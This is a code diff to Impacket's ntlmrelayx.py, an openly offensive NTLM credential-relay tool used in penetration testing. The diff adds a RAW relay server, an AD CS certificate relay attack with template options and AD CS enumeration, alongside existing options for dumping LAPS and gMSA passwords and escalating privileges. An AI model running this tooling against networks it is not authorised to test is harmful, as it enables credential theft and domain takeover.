@@ -1,35 +1,37 @@
 #!/usr/bin/env python
-# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
+# Impacket - Collection of Python classes for working with network protocols.
 #
-# This software is provided under under a slightly modified version
+# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
+#
+# This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
-# Generic NTLM Relay Module
+# Description:
+#   Generic NTLM Relay Module
+#
+#   This module performs the SMB Relay attacks originally discovered
+#   by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc).
+#   It receives a list of targets and for every connection received it
+#   will choose the next target and try to relay the credentials. Also, if
+#   specified, it will first to try authenticate against the client connecting
+#   to us.
+#
+#   It is implemented by invoking a SMB and HTTP Server, hooking to a few
+#   functions and then using the specific protocol clients (e.g. SMB, LDAP).
+#   It is supposed to be working on any LM Compatibility level. The only way
+#   to stop this attack is to enforce on the server SPN checks and or signing.
+#
+#   If the authentication against the targets succeeds, the client authentication
+#   succeeds as well and a valid connection is set against the local smbserver.
+#   It's up to the user to set up the local smbserver functionality. One option
+#   is to set up shares with whatever files you want to so the victim thinks it's
+#   connected to a valid SMB server. All that is done through the smb.conf file or
+#   programmatically.
 #
 # Authors:
-#  Alberto Solino (@agsolino)
-#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
-#
-# Description:
-#             This module performs the SMB Relay attacks originally discovered
-# by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc).
-# It receives a list of targets and for every connection received it
-# will choose the next target and try to relay the credentials. Also, if
-# specified, it will first to try authenticate against the client connecting
-# to us.
-#
-# It is implemented by invoking a SMB and HTTP Server, hooking to a few
-# functions and then using the specific protocol clients (e.g. SMB, LDAP).
-# It is supposed to be working on any LM Compatibility level. The only way
-# to stop this attack is to enforce on the server SPN checks and or signing.
-#
-# If the authentication against the targets succeeds, the client authentication
-# succeeds as well and a valid connection is set against the local smbserver.
-# It's up to the user to set up the local smbserver functionality. One option
-# is to set up shares with whatever files you want to so the victim thinks it's
-# connected to a valid SMB server. All that is done through the smb.conf file or
-# programmatically.
+#   Alberto Solino (@agsolino)
+#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
 #
 
 import argparse
@@ -46,7 +48,7 @@ from threading import Thread
 
 from impacket import version
 from impacket.examples import logger
-from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer
+from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer, RAWRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
 from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
@@ -150,7 +152,7 @@ def start_servers(options, threads):
         c.setAttacks(PROTOCOL_ATTACKS)
         c.setLootdir(options.lootdir)
         c.setOutputFile(options.output_file)
-        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.sid)
+        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid)
         c.setRPCOptions(options.rpc_mode, options.rpc_use_smb, options.auth_smb, options.hashes_smb, options.rpc_smb_port)
         c.setMSSQLOptions(options.query)
         c.setInteractive(options.interactive)
@@ -162,6 +164,8 @@ def start_servers(options, threads):
         c.setInterfaceIp(options.interface_ip)
         c.setExploitOptions(options.remove_mic, options.remove_target)
         c.setWebDAVOptions(options.serve_image)
+        c.setIsADCSAttack(options.adcs)
+        c.setADCSOptions(options.template)
 
         if server is HTTPRelayServer:
             c.setListeningPort(options.http_port)
@@ -170,6 +174,9 @@ def start_servers(options, threads):
             c.setListeningPort(options.smb_port)
         elif server is WCFRelayServer:
             c.setListeningPort(options.wcf_port)
+        elif server is RAWRelayServer:
+            c.setListeningPort(options.raw_port)
+        
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
         if server is HTTPRelayServer and options.r is not None:
@@ -229,10 +236,12 @@ if __name__ == '__main__':
     serversoptions.add_argument('--no-smb-server', action='store_true', help='Disables the SMB server')
     serversoptions.add_argument('--no-http-server', action='store_true', help='Disables the HTTP server')
     serversoptions.add_argument('--no-wcf-server', action='store_true', help='Disables the WCF server')
+    serversoptions.add_argument('--no-raw-server', action='store_true', help='Disables the RAW server')
 
     parser.add_argument('--smb-port', type=int, help='Port to listen on smb server', default=445)
     parser.add_argument('--http-port', type=int, help='Port to listen on http server', default=80)
     parser.add_argument('--wcf-port', type=int, help='Port to listen on wcf server', default=9389)  # ADWS
+    parser.add_argument('--raw-port', type=int, help='Port to listen on raw server', default=6666)
 
     parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
@@ -307,6 +316,7 @@ if __name__ == '__main__':
     ldapoptions.add_argument('--sid', action='store_true', required=False, help='Use a SID to delegate access rather than an account name')
     ldapoptions.add_argument('--dump-laps', action='store_true', required=False, help='Attempt to dump any LAPS passwords readable by the user')
     ldapoptions.add_argument('--dump-gmsa', action='store_true', required=False, help='Attempt to dump any gMSA passwords readable by the user')
+    ldapoptions.add_argument('--dump-adcs', action='store_true', required=False, help='Attempt to dump ADCS enrollment services and certificate templates info')
 
     #IMAP options
     imapoptions = parser.add_argument_group("IMAP client options")
@@ -317,6 +327,11 @@ if __name__ == '__main__':
                         'dump all emails')
     imapoptions.add_argument('-im','--imap-max', action='store',type=int, required=False,default=0, help='Max number of emails to dump '
         '(0 = unlimited, default: no limit)')
+
+    # AD CS options
+    adcsoptions = parser.add_argument_group("AD CS attack options")
+    adcsoptions.add_argument('--adcs', action='store_true', required=False, help='Enable AD CS relay attack')
+    adcsoptions.add_argument('--template', action='store', metavar="TEMPLATE", required=False, help='AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`')
 
     try:
        options = parser.parse_args()
@@ -376,6 +391,9 @@ if __name__ == '__main__':
 
     if not options.no_wcf_server:
         RELAY_SERVERS.append(WCFRelayServer)
+        
+    if not options.no_raw_server:
+        RELAY_SERVERS.append(RAWRelayServer)
 
     if targetSystem is not None and options.w:
         watchthread = TargetsFileWatcher(targetSystem)
